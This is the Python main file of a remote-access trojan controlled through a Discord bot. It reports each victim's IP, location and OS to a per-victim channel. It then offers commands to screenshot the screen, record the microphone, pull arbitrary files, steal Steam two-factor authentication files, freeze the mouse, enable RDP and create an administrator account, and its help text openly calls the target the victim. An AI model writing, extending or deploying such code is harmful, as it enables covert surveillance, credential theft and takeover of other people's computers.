import discord
from discord.ext import commands
from discord.ext.commands import bot
from dotenv import load_dotenv
import threading
import os as osVars
import os.path as osp
import platform
# Features importing
from features.func import *
from features.setup import *
from features.steam2fa import *
from features.screenRecord import *
from features.windows import *



def main():

    load_dotenv() #take enviroment variables from file .env
    bot = commands.Bot(command_prefix="!")
    ip = get_ip()
    identifier = sanity()

    # Guild, Bot Token input
    channel_id = int(osVars.environ.get("DISCORD_CHANNEL_ID")) # should be in int type!
    token = osVars.environ.get("DISCORD_TOKEN") # should be in string type!

    os = platform.platform()
    country, city = get_location(ip)

    threads = []

    @bot.event
    async def on_ready():  #This func will start when the bot is ready to use
        
        guild = bot.get_guild(int(osVars.environ.get("DISCORD_GUILD_ID")))
        channel_name = await guild.create_text_channel(identifier)
        print(f"Created new channel: {channel_name}")
        channel_id = discord.utils.get(bot.get_all_channels(), name=identifier)
        c2 = bot.get_channel(channel_id.id)

        await c2.send(f"-------------------------------------------------------"
                      f"\nNew Connection:\n\n"
                      f"{ip}\n"
                      f"{country}, {city}\n"
                      f"{os}\n\n"
                      f"!get_help for help\n"
                      f"-------------------------------------------------------")

    @bot.command()
    async def dox(ctx):
        await ctx.send(ip)

    @bot.command()
    async def mouse(ctx, freeze_time):
        result, fixed_time = time_prep(freeze_time)
        if result:
            await ctx.send(f"Freezing mouse for {fixed_time} seconds")
            freeze_thread = threading.Thread(target=freeze_mouse, args=(fixed_time,))
            freeze_thread.start()
        else:
            await ctx.send("Please specify freeze time in the right format")

    @bot.command()
    async def screen(ctx):
        screen_path = screenshot()
        await ctx.send(file=discord.File(screen_path))
        os.remove(screen_path)

    @bot.command()
    async def download(ctx, path):
        if osp.exists(path):
            await ctx.send(file=discord.File(path))
        else:
            await ctx.send("File doesn't exist, try supplying the full path")

    @bot.command()
    async def record(ctx, record_time):
        result, fixed_time = time_prep(record_time)
        if result:
            await ctx.send(f"Recording audio for {fixed_time} seconds")

            recording_path = record_mic(fixed_time)
            await ctx.send(f"Uploading file...")
            await ctx.send(file=discord.File(recording_path))
            os.remove(recording_path)
        else:
            await ctx.send("Please specify record time in the right format")

    # to implement thread handling
    @bot.command()
    async def disconnect(ctx):
        await ctx.send("Closing bot...")
        exit(0)

    @bot.command()
    async def safe_disconnect(ctx):
        await ctx.send("Safe exit... (This might take a while)")
        for thread in threads:
            thread.join()
        exit(0)
        
    @bot.command()
    async def getSteam2fa(ctx):
        for file in getSteamFils():
            if osp.exists(file):
                await ctx.send(f"Uploading file...")
                await ctx.send(file=discord.File(file))
            else:
                await ctx.send("Steam file doesn't exist")

    @bot.command()
    async def rdp_enable(ctx):
        if enable_rdp_on_target():
            await ctx.send("Enabled RDP on target")

    @bot.command()
    async def create_admin_user(ctx):
        username = create_user_account_on_target()
        if username:
            await ctx.send("Created user on target")
            if add_user_account_to_administrators(username):
                await ctx.send(f"{username} is now an administrator on target")
                await ctx.send(f"Creds are - {username}:{username}")

    @bot.command()
    async def get_help(ctx):
        await ctx.send("------------------------------- HELP -------------------------------\n\n"
                       "!get_help -> View help message (This message)\n"
                       "Usage: !get_help\n\n"
                       
                       "!mouse -> Freeze victim's mouse for a specified time:\n"
                       "Usage: !mouse Xs | !mouse Xm | !mouse Xh (X is a number)\n\n"
                       
                       "!screen -> Get a screenshot of the victim's screen\n"
                       "Usage: !screen\n\n"
                       
                       "!download -> Download a file from the victim's machine:\n"
                       "Usage: !download \"file path\"\n\n"
                       
                       "!record -> Record victim's default audio input & output\n"
                       "Usage: !record Xs | !record Xm | !record Xh (X is a number)\n\n"
                       
                       "!getSteam2fa-> Get Steam authentication files\n "
                       "Usage: !getSteam2fa\n\n"

                       "!disconnect -> Close the bot, will terminate the program immediately\n"
                       "Usage: !disconnect\n\n"
                       
                       "!safe_disconnect -> Close the bot safely, will close all created threads\n"
                       "USage: !safe_disconnect\n\n"
                       "------------------------------- HELP -------------------------------")

    bot.run(token)
    
    

if __name__ == "__main__":
    main()